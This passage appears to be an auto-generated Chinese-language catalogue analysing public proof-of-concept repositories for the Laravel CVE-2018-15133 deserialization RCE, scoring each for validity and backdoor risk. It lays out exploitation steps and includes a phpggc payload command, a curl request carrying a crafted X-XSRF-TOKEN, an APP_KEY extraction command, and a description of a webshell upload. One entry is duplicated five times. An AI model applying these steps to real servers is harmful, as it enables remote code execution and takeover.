*   发送带有构造的 X-XSRF-TOKEN 值的 HTTP 请求到目标 URL。

该 POC 代码使用了 OpenSSL 库进行 AES 加密和 HMAC 计算，并且使用了 Base64 编码。  代码逻辑与漏洞描述一致，即利用已知的 application key，构造恶意payload，经过加密、编码后，作为 X-XSRF-TOKEN 发送，从而触发反序列化漏洞。

**投毒风险：**

该 POC 代码主要由 `main.cpp` 和 `build.sh` 构成。`build.sh` 负责编译 `main.cpp`。`main.cpp` 代码量相对较大，人工review 存在疏漏的可能。以下是我对投毒风险的分析：

*   **正面因素：** 代码逻辑主要集中在实现漏洞利用上，包括参数解析、payload 生成、加密、编码、HTTP 请求发送等。没有发现明显的恶意代码或后门。
*   **负面因素：**  代码使用了第三方库 OpenSSL，并且包含一些字符串处理和内存管理操作，这些地方可能存在安全漏洞。例如，如果代码没有正确处理字符串长度，可能会导致缓冲区溢出。
*   **潜在风险：** 攻击者可能通过修改 `build.sh` 添加额外的编译选项，例如链接恶意库，从而植入后门。但是，提供的 `build.sh` 文件比较简单，只包含编译命令，没有发现任何可疑操作。

综合来看，该仓库中存在作者隐藏的投毒代码的可能性较低，大概在5%左右。主要风险在于代码中可能存在的潜在安全漏洞，以及编译过程中可能被利用的风险。

**项目地址:** [NatteeSetobol/CVE-2018-15133-Lavel-Expliot](https://github.com/NatteeSetobol/CVE-2018-15133-Lavel-Expliot)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #8

**来源**: [CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md](../2018/CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 5.5.x <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，通过 X-XSRF-TOKEN 传递恶意序列化数据。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-15133 漏洞是 Laravel 框架中由于对 X-XSRF-TOKEN 值的反序列化操作不当导致的远程代码执行漏洞。攻击者可以构造恶意的序列化数据，通过 X-XSRF-TOKEN 头部发送给服务器，服务器在解密和反序列化该数据时，执行攻击者预先设定的恶意代码。漏洞利用的关键在于需要知道 Laravel 应用的 APP_KEY，才能成功加密和构造恶意数据。搜索结果表明该漏洞已被CISA列入已知被利用的漏洞目录。

提供的漏洞利用代码 `rce.sh` 通过访问 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` 接口，利用该接口执行PHP代码的特性，尝试上传一个PHP Webshell（uploader.php）。虽然脚本本身的功能是上传webshell，但脚本并不会主动植入恶意后门,所以判定投毒风险为0%。 脚本的原理是利用 phpunit 的 eval-stdin.php 文件, 该文件可以执行POST请求中的PHP代码, 从而进行webshell上传。 这种利用方式依赖于目标环境存在phpunit且eval-stdin.php文件存在且可访问。

**项目地址:** [Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader](https://github.com/Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #9

**来源**: [CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md](../2018/CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 and 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，这通常需要事先获得了特权访问权限或成功实施了先前的攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞。攻击者可以利用此漏洞，通过在X-XSRF-TOKEN中注入恶意序列化数据，实现在目标服务器上执行任意代码。漏洞利用的核心在于`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法和`phpggc`中的`gadgetchains/Laravel/RCE/3/chain.php`。

**有效性：**

从漏洞描述和搜索结果来看，此漏洞已经被CISA列入已知被利用的漏洞目录，表明该漏洞在野外被积极利用。提供的PoC代码基于已知的利用方式，并参考了 Metasploit 的 exploit，所以该PoC代码有效。

**投毒风险：**

PoC代码主要由两个文件组成：`README.md` 和 `pwn_laravel.py`。

*   `README.md`: 包含漏洞描述、利用方法、依赖安装和免责声明等信息。没有发现恶意代码。
*   `pwn_laravel.py`: PoC利用脚本，用于生成恶意payload并发送到目标服务器。脚本利用了`Crypto`库进行加密和解密操作。虽然代码功能是实现RCE，但本身逻辑并没有发现明显的投毒行为。

分析后认为，投毒风险主要存在于依赖项上，尤其是`Crypto`库。但是由于该库比较常用，如果存在恶意代码，可能会被更早发现。

根据代码的功能和依赖关系，判定投毒风险为10%。

**利用方式：**

1.  **获取APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要获取目标Laravel应用的APP_KEY。APP_KEY通常存储在`.env`文件中。
2.  **生成恶意Payload：** 使用PoC脚本`pwn_laravel.py`，指定目标URL、APP_KEY和要执行的命令，生成恶意的序列化数据，并使用APP_KEY对其进行加密。
3.  **发送请求：** 将生成的加密数据作为`X-XSRF-TOKEN`的值，通过HTTP请求发送到目标Laravel应用。
4.  **触发反序列化：** Laravel应用在处理请求时，会尝试解密`X-XSRF-TOKEN`，并对其进行反序列化。如果APP_KEY正确，且反序列化链存在，则会导致远程代码执行。

总而言之，该漏洞的利用依赖于APP_KEY的泄露，攻击难度较高，但危害性很大。

**项目地址:** [aljavier/exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #10

**来源**: [CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md](../2018/CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常不易获取，除非之前已获得权限或成功进行过其他攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中。由于对 X-XSRF-TOKEN 值进行不可信的反序列化调用，可能导致远程代码执行。涉及到 Illuminate/Encryption/Encrypter.php 中的 decrypt 方法和 phpggc 中 gadgetchains/Laravel/RCE/3/chain.php 。攻击者必须知道应用程序密钥（APP_KEY），这通常不会发生，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能会发生。

**利用方式：**

1.  **获取 APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要设法获取 Laravel 应用的 APP_KEY，这可能通过源代码泄露、数据库访问或其他漏洞实现。
2.  **构造恶意 XSRF-TOKEN：** 使用 phpggc 工具生成包含恶意 PHP 对象的序列化字符串。该对象旨在利用 Laravel 框架中的反序列化漏洞执行任意代码。
3.  **加密 Payload：**  使用 APP_KEY 对序列化的 Payload 进行加密，生成有效的 XSRF-TOKEN。代码中的`cve.php`脚本完成了这个步骤，使用APP_KEY对phpggc生成的Payload加密，然后放入Cookie中。
4.  **发送包含恶意 XSRF-TOKEN 的请求：**  将构造的 XSRF-TOKEN 设置为 Cookie，并发送到目标 Laravel 应用。
5.  **触发反序列化：**  当 Laravel 应用尝试解密并反序列化 XSRF-TOKEN 时，恶意对象将被实例化，从而执行攻击者指定的代码。

**POC有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，此POC有效。存在多个公开的漏洞利用代码，CISA也将此漏洞标记为已知被利用漏洞，增加了POC的有效性。

**投毒风险：**

虽然主利用脚本 `cve.php` 看起来是直接利用漏洞，但仍然存在一些潜在的投毒风险：

*   **依赖外部资源：** `cve.php` 依赖于 `phpggc` 工具，如果 `phpggc` 被篡改，可能会引入恶意代码。风险相对较低，因为 `phpggc` 是一个广泛使用的工具，被篡改的可能性较低。但是仍需确认。
*   **shell_exec函数滥用风险：** `cve.php` 中多次使用了 `shell_exec` 函数，包括执行 `phpggc` 命令和 `curl` 命令。如果攻击者可以控制这些命令的参数，就可能执行任意系统命令。由于 `cve.php` 需要用户提供 APP_KEY 和目标 URL，并且有 payload 参数，存在用户误用的情况，比如直接使用了恶意payload。
*   **README.md文件：**此文件是正常的说明文档，没有发现投毒内容。
*   **phpggc:** 本身作为一个payload生成器，其本身不应该作为投毒风险考虑，而是应该考虑其生成payload的安全性。

考虑到以上因素，评估此仓库的投毒风险为 10%。 风险主要集中在用户误用，或者`phpggc`工具被篡改的可能性。

**项目地址:** [bukitbarisan/laravel-rce-cve-2018-15133](https://github.com/bukitbarisan/laravel-rce-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #11

**来源**: [CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md](../2018/CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework Token Unserialize RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常需要之前已经获得的特权访问或成功利用了之前的漏洞。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133 漏洞是 Laravel Framework 中由于对 X-XSRF-TOKEN 值进行不安全的反序列化操作导致的远程代码执行漏洞。攻击者可以通过伪造恶意的 X-XSRF-TOKEN，并将其加密后发送给服务器，服务器在解密并反序列化该 token 时，会执行攻击者预先设定的恶意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞的 POC 代码是有效的。搜索引擎结果中包含了多个指向该漏洞的详细描述、利用代码示例以及缓解措施的文章，包括 CISA 将其添加到已知被利用的漏洞目录中。
提供的 Dockerfile 文件和 README.md 文件描述了如何搭建一个存在漏洞的 Laravel 环境并利用 `cve-2018-15133.php` 脚本进行攻击。README.md 中给出了详细的利用步骤，包括获取 APP_KEY，生成反序列化 Payload，加密 Payload，最后通过 POST 请求发送 Payload。脚本通过构造特定的 PHP 对象，在反序列化时触发 `system()` 函数来执行任意命令。

**投毒风险：**
Dockerfile文件用于构建一个包含漏洞版本的Laravel应用的Docker镜像。 cve-2018-15133.php 用于漏洞利用，并没有发现可疑或恶意行为，因此投毒风险较低。

代码仓库中主要为演示漏洞利用的代码，并无发现存在恶意行为或后门的代码。`phpggc` 用于生成payload，但其本身不是由该作者提供的,所以此处不做分析。Dockerfile 安装的是已知漏洞版本的 Laravel，用于复现，而不是植入后门，所以投毒可能性较低。 投毒风险较低，大约在1%以下。

**利用方式：**
1.  **获取 APP_KEY：** 攻击者需要首先获取 Laravel 应用的 APP_KEY。通常，这需要攻击者已经获得了服务器的某些权限，例如读取 `.env` 文件的权限。可以通过`docker exec -it $(docker ps --latest --quiet) grep -e ^APP_KEY /var/www/html/laravel/.env`来获取，这说明需要一定的权限才能获取该KEY，这使得利用难度增大。
2.  **生成反序列化 Payload：** 攻击者使用 `phpggc` 工具（或类似工具）生成一个恶意 PHP 反序列化 Payload。该 Payload 包含一个精心构造的对象链，当被反序列化时，会执行任意命令。 例如，`phpggc Laravel/RCE1 'uname -a' -b`。
3.  **加密 Payload：** 使用 Laravel 的加密机制（`Illuminate\Encryption\Encrypter`）以及 APP_KEY 对 Payload 进行加密，生成一个类似于 Laravel XSRF-TOKEN 的字符串。这通过 cve-2018-15133.php 进行
4.  **发送 Payload：** 将加密后的 Payload 放在 `X-XSRF-TOKEN` HTTP header 中，发送一个 POST 请求到存在漏洞的 Laravel 应用。 例如：`curl localhost:8000 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Imp3c1BUejE5aGFFUVM4a0NcLzIyODBnPT0iLCJ2YWx1ZSI6InZrTEdOY2o1NlVJdlltWFl3OFBxTEY1a1pCZWlaSDRSdXM1STNSa21sSE5Cb3hFd09cL2JUdU0wWHhjK0dUU0dYQzlTd3ZYSm50NTc4NW90UnNrZW5mMHc2RHdcLzZia01cL29wVUhjQml5cCtmZ1VcL2lwbnVySG52MHEwWXdZMVFVSXhWYjFEQlwveTZPQ3JORnRYdVQyeVFnODM1UGVCSVFcL3B6RGs2VDczOTZEbkFKdFwvc3lpZXBtcUo4VllLNU4zS0pMV3ZBUlNXZDRHRmNnOG1vOFZUWDVicE5uV0FcL1NSXC9HRjh2XC9YR2pLUDlEdlEwaytWRHl5TFhvb3RXM0Y4ejNXIiwibWFjIjoiOTMwMTNkZDYwYzNjYmQ1YTg4ZjRmNjM2NmZhMzBjNzA5NTgzYmI`
5.  **触发 RCE：** Laravel 应用在处理请求时，会解密并反序列化 `X-XSRF-TOKEN` 的值。由于 Payload 是恶意的，反序列化过程会触发远程代码执行，导致服务器执行攻击者预先设定的命令。


**项目地址:** [kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #12

**来源**: [CVE-2018-15133-pwnedshell_Larascript.md](../2018/CVE-2018-15133-pwnedshell_Larascript.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的key，通常不容易获取，除非之前已经有特权访问或者已经成功攻击。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-15133 是 Laravel Framework 中的一个反序列化远程代码执行漏洞。攻击者可以通过在 X-XSRF-TOKEN 中插入恶意序列化数据，利用 Illuminate/Encryption/Encrypter.php 中的 decrypt 方法触发反序列化操作，结合 phpggc 中的 gadgetchains/Laravel/RCE/3/chain.php 链执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码仓库（`aljavier/exploit_laravel_cve-2018-15133` 和 `kozmic/laravel-poc-CVE-2018-15133`），该漏洞存在有效的利用方式。CISA 也将其加入到了已知被利用的漏洞列表中，证明其具有实际的威胁。

**投毒风险：**
提供的漏洞利用代码只有LICENSE，属于协议声明，不存在投毒代码。
`aljavier/exploit_laravel_cve-2018-15133`仓库包含exp利用代码。
`kozmic/laravel-poc-CVE-2018-15133` 仓库提供了一个简单的 Laravel 应用 PoC，证明了漏洞的可利用性。根据提供的代码片段，无法判断是否存在隐藏的投毒代码，需要进一步分析整个仓库的代码。
由于提供的漏洞利用代码只是协议说明，无法判断投毒风险，只能说明提供的代码没有投毒风险。

**利用方式：**
1.  **获取应用Key：** 攻击者需要首先获取 Laravel 应用的 APP_KEY。这通常是攻击中最困难的部分，可以通过信息泄露、目录遍历等方式尝试获取。
2.  **生成恶意Payload：** 使用 phpggc 工具，选择 Laravel/RCE/3 gadget 链，并指定要执行的命令，生成序列化的 payload。
3.  **加密Payload：** 使用获取到的 APP_KEY，利用 Laravel 的加密方法（Illuminate/Encryption/Encrypter.php）对 payload 进行加密。
4.  **发送请求：** 将加密后的 payload 放入 X-XSRF-TOKEN Cookie 中，发送到存在漏洞的 Laravel 应用。
5.  **触发RCE：** 当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，将触发 gadget 链，执行预先设定的恶意命令，实现远程代码执行。

**项目地址:** [pwnedshell/Larascript](https://github.com/pwnedshell/Larascript)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #13

**来源**: [CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md)

## CVE-2018-15133-Laravel框架反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29, <=5.7.27

**利用条件:** 需要知道APP_KEY

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，是由于对 X-XSRF-TOKEN 值的反序列化操作不安全导致的远程代码执行漏洞。攻击者需要事先获得应用的 APP_KEY，才能构造恶意的序列化数据，通过修改 X-XSRF-TOKEN 的值，发送请求到服务器触发反序列化，从而执行任意代码。

**有效性：** 提供的 PoC 代码是有效的。从提供的 `README.md` 和 `exploit.py` 文件可以看出，该 PoC 包含以下步骤：
1.  构建包含漏洞的 Laravel 环境（通过 Dockerfile 和 docker-compose.yaml）。
2.  提取 Laravel 应用的 APP_KEY。
3.  使用 APP_KEY 和要执行的命令，通过 `exploit.py` 生成恶意 payload。
4.  将 payload 作为 X-XSRF-TOKEN 发送给 Laravel 应用，触发反序列化漏洞，从而执行任意命令。

**投毒风险：** 仓库的投毒风险较低，大约为 5%。 主要理由如下:
* Dockerfile构建标准Laravel环境，风险较低。
* exploit.py逻辑清晰，主要功能是构造payload进行攻击，没有发现恶意代码。
* docker-compose.yaml文件用于编排容器，没有发现可疑配置。
* 存在的风险是构建的docker镜像可能包含其他已知的软件漏洞，但并非作者主动投毒。
* 综合判断，主要代码功能符合漏洞利用的预期，恶意投毒可能性较低。

**利用方式：**
1.  攻击者首先需要获得目标 Laravel 应用的 APP_KEY。这可能通过信息泄露、代码审计等方式获得。
2.  攻击者使用 phpggc 等工具，基于已知的 Laravel gadget chain，生成恶意的序列化 payload。  或者使用`exploit.py`中类似的方式构造payload。
3.  攻击者将 payload 进行加密和编码，然后将其设置为 X-XSRF-TOKEN cookie 的值。
4.  攻击者向目标 Laravel 应用发送请求，当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，就会触发漏洞，执行 payload 中包含的恶意代码。

**项目地址:** [yeahhbean/Laravel-CVE-2018-15133](https://github.com/yeahhbean/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---



---

## POC #13

**来源**: [CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md)

## CVE-2018-15133-Laravel框架反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29, <=5.7.27

**利用条件:** 需要知道APP_KEY

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，是由于对 X-XSRF-TOKEN 值的反序列化操作不安全导致的远程代码执行漏洞。攻击者需要事先获得应用的 APP_KEY，才能构造恶意的序列化数据，通过修改 X-XSRF-TOKEN 的值，发送请求到服务器触发反序列化，从而执行任意代码。

**有效性：** 提供的 PoC 代码是有效的。从提供的 `README.md` 和 `exploit.py` 文件可以看出，该 PoC 包含以下步骤：
1.  构建包含漏洞的 Laravel 环境（通过 Dockerfile 和 docker-compose.yaml）。
2.  提取 Laravel 应用的 APP_KEY。
3.  使用 APP_KEY 和要执行的命令，通过 `exploit.py` 生成恶意 payload。
4.  将 payload 作为 X-XSRF-TOKEN 发送给 Laravel 应用，触发反序列化漏洞，从而执行任意命令。

**投毒风险：** 仓库的投毒风险较低，大约为 5%。 主要理由如下:
* Dockerfile构建标准Laravel环境，风险较低。
* exploit.py逻辑清晰，主要功能是构造payload进行攻击，没有发现恶意代码。
* docker-compose.yaml文件用于编排容器，没有发现可疑配置。
* 存在的风险是构建的docker镜像可能包含其他已知的软件漏洞，但并非作者主动投毒。
* 综合判断，主要代码功能符合漏洞利用的预期，恶意投毒可能性较低。

**利用方式：**
1.  攻击者首先需要获得目标 Laravel 应用的 APP_KEY。这可能通过信息泄露、代码审计等方式获得。
2.  攻击者使用 phpggc 等工具，基于已知的 Laravel gadget chain，生成恶意的序列化 payload。  或者使用`exploit.py`中类似的方式构造payload。
3.  攻击者将 payload 进行加密和编码，然后将其设置为 X-XSRF-TOKEN cookie 的值。
4.  攻击者向目标 Laravel 应用发送请求，当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，就会触发漏洞，执行 payload 中包含的恶意代码。

**项目地址:** [yeahhbean/Laravel-CVE-2018-15133](https://github.com/yeahhbean/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---



---

## POC #13

**来源**: [CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md)

## CVE-2018-15133-Laravel框架反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29, <=5.7.27

**利用条件:** 需要知道APP_KEY

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，是由于对 X-XSRF-TOKEN 值的反序列化操作不安全导致的远程代码执行漏洞。攻击者需要事先获得应用的 APP_KEY，才能构造恶意的序列化数据，通过修改 X-XSRF-TOKEN 的值，发送请求到服务器触发反序列化，从而执行任意代码。

**有效性：** 提供的 PoC 代码是有效的。从提供的 `README.md` 和 `exploit.py` 文件可以看出，该 PoC 包含以下步骤：
1.  构建包含漏洞的 Laravel 环境（通过 Dockerfile 和 docker-compose.yaml）。
2.  提取 Laravel 应用的 APP_KEY。
3.  使用 APP_KEY 和要执行的命令，通过 `exploit.py` 生成恶意 payload。
4.  将 payload 作为 X-XSRF-TOKEN 发送给 Laravel 应用，触发反序列化漏洞，从而执行任意命令。

**投毒风险：** 仓库的投毒风险较低，大约为 5%。 主要理由如下:
* Dockerfile构建标准Laravel环境，风险较低。
* exploit.py逻辑清晰，主要功能是构造payload进行攻击，没有发现恶意代码。
* docker-compose.yaml文件用于编排容器，没有发现可疑配置。
* 存在的风险是构建的docker镜像可能包含其他已知的软件漏洞，但并非作者主动投毒。
* 综合判断，主要代码功能符合漏洞利用的预期，恶意投毒可能性较低。

**利用方式：**
1.  攻击者首先需要获得目标 Laravel 应用的 APP_KEY。这可能通过信息泄露、代码审计等方式获得。
2.  攻击者使用 phpggc 等工具，基于已知的 Laravel gadget chain，生成恶意的序列化 payload。  或者使用`exploit.py`中类似的方式构造payload。
3.  攻击者将 payload 进行加密和编码，然后将其设置为 X-XSRF-TOKEN cookie 的值。
4.  攻击者向目标 Laravel 应用发送请求，当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，就会触发漏洞，执行 payload 中包含的恶意代码。

**项目地址:** [yeahhbean/Laravel-CVE-2018-15133](https://github.com/yeahhbean/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---



---

## POC #13

**来源**: [CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md)

## CVE-2018-15133-Laravel框架反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29, <=5.7.27

**利用条件:** 需要知道APP_KEY

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，是由于对 X-XSRF-TOKEN 值的反序列化操作不安全导致的远程代码执行漏洞。攻击者需要事先获得应用的 APP_KEY，才能构造恶意的序列化数据，通过修改 X-XSRF-TOKEN 的值，发送请求到服务器触发反序列化，从而执行任意代码。

**有效性：** 提供的 PoC 代码是有效的。从提供的 `README.md` 和 `exploit.py` 文件可以看出，该 PoC 包含以下步骤：
1.  构建包含漏洞的 Laravel 环境（通过 Dockerfile 和 docker-compose.yaml）。
2.  提取 Laravel 应用的 APP_KEY。
3.  使用 APP_KEY 和要执行的命令，通过 `exploit.py` 生成恶意 payload。
4.  将 payload 作为 X-XSRF-TOKEN 发送给 Laravel 应用，触发反序列化漏洞，从而执行任意命令。

**投毒风险：** 仓库的投毒风险较低，大约为 5%。 主要理由如下:
* Dockerfile构建标准Laravel环境，风险较低。
* exploit.py逻辑清晰，主要功能是构造payload进行攻击，没有发现恶意代码。
* docker-compose.yaml文件用于编排容器，没有发现可疑配置。
* 存在的风险是构建的docker镜像可能包含其他已知的软件漏洞，但并非作者主动投毒。
* 综合判断，主要代码功能符合漏洞利用的预期，恶意投毒可能性较低。

**利用方式：**
1.  攻击者首先需要获得目标 Laravel 应用的 APP_KEY。这可能通过信息泄露、代码审计等方式获得。
2.  攻击者使用 phpggc 等工具，基于已知的 Laravel gadget chain，生成恶意的序列化 payload。  或者使用`exploit.py`中类似的方式构造payload。
3.  攻击者将 payload 进行加密和编码，然后将其设置为 X-XSRF-TOKEN cookie 的值。
4.  攻击者向目标 Laravel 应用发送请求，当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，就会触发漏洞，执行 payload 中包含的恶意代码。

**项目地址:** [yeahhbean/Laravel-CVE-2018-15133](https://github.com/yeahhbean/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---



---

## POC #13

**来源**: [CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-yeahhbean_Laravel-CVE-2018-15133.md)

## CVE-2018-15133-Laravel框架反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29, <=5.7.27

**利用条件:** 需要知道APP_KEY

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，是由于对 X-XSRF-TOKEN 值的反序列化操作不安全导致的远程代码执行漏洞。攻击者需要事先获得应用的 APP_KEY，才能构造恶意的序列化数据，通过修改 X-XSRF-TOKEN 的值，发送请求到服务器触发反序列化，从而执行任意代码。

**有效性：** 提供的 PoC 代码是有效的。从提供的 `README.md` 和 `exploit.py` 文件可以看出，该 PoC 包含以下步骤：
1.  构建包含漏洞的 Laravel 环境（通过 Dockerfile 和 docker-compose.yaml）。
2.  提取 Laravel 应用的 APP_KEY。
3.  使用 APP_KEY 和要执行的命令，通过 `exploit.py` 生成恶意 payload。
4.  将 payload 作为 X-XSRF-TOKEN 发送给 Laravel 应用，触发反序列化漏洞，从而执行任意命令。

**投毒风险：** 仓库的投毒风险较低，大约为 5%。 主要理由如下:
* Dockerfile构建标准Laravel环境，风险较低。
* exploit.py逻辑清晰，主要功能是构造payload进行攻击，没有发现恶意代码。
* docker-compose.yaml文件用于编排容器，没有发现可疑配置。
* 存在的风险是构建的docker镜像可能包含其他已知的软件漏洞，但并非作者主动投毒。
* 综合判断，主要代码功能符合漏洞利用的预期，恶意投毒可能性较低。

**利用方式：**
1.  攻击者首先需要获得目标 Laravel 应用的 APP_KEY。这可能通过信息泄露、代码审计等方式获得。
2.  攻击者使用 phpggc 等工具，基于已知的 Laravel gadget chain，生成恶意的序列化 payload。  或者使用`exploit.py`中类似的方式构造payload。
3.  攻击者将 payload 进行加密和编码，然后将其设置为 X-XSRF-TOKEN cookie 的值。
4.  攻击者向目标 Laravel 应用发送请求，当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，就会触发漏洞，执行 payload 中包含的恶意代码。

**项目地址:** [yeahhbean/Laravel-CVE-2018-15133](https://github.com/yeahhbean/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

